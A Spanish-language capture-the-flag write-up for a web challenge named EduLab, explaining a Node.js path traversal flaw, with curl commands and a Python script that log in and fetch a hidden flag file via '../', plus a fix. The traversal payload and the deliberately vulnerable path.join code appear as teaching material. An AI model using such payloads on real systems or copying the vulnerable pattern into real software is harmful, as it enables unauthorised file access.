# EduLab — El archivo oculto

| | |
|---|---|
| **Categoría** | Web |
| **Dificultad** | Fácil |
| **Puntos** | 100 |
| **Reto #** | 04 |
| **Instancia** | `http://chals.tropicalhunters.com:9015` |
| **Credenciales** | `ana` / `VPJPW5HAYuAUP8uf` |

## Descripción

La plataforma EduLab permite descargar materiales de estudio a través de un endpoint que recibe el nombre del archivo como parámetro. Existe un directorio `solucionario/` que nunca se enlaza en la UI pero que el servidor sí sirve.

## Vulnerabilidad

**Path Traversal (CWE-22)**

El servidor construye la ruta así:

```js
const filePath = path.join(MATERIALS_DIR, req.query.file);
return fs.readFile(filePath);
```

Sin llamar a `path.resolve()` ni verificar que el resultado empiece con `MATERIALS_DIR`, cualquier secuencia `../` permite salir del directorio autorizado.

## Solución

### 1. Obtener sesión

```bash
curl -sc cookies.txt \
  "http://chals.tropicalhunters.com:9015/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"ana","password":"VPJPW5HAYuAUP8uf"}'
```

### 2. Path traversal

```bash
curl -sb cookies.txt \
  "http://chals.tropicalhunters.com:9015/api/materials/download?file=../solucionario/flag.txt"
```

El `../` sube un nivel (de `materiales/` a la raíz del contenido) y `solucionario/flag.txt` apunta al archivo protegido.

### 3. Script automatizado

```python
import requests

s = requests.Session()
s.post("http://chals.tropicalhunters.com:9015/api/auth/login",
       json={"username": "ana", "password": "VPJPW5HAYuAUP8uf"})

r = s.get("http://chals.tropicalhunters.com:9015/api/materials/download",
          params={"file": "../solucionario/flag.txt"})
print(r.text)
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Mitigación

```js
const safe = path.resolve(MATERIALS_DIR, req.query.file);
if (!safe.startsWith(MATERIALS_DIR))
    return res.status(403).json({ error: "acceso denegado" });
```

- En Node.js, `path.join` **no** protege contra traversal; solo `path.resolve` + verificación de prefijo lo hace.
- Un directorio no enlazado en la UI no es seguridad: si el servidor lo sirve, es accesible.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
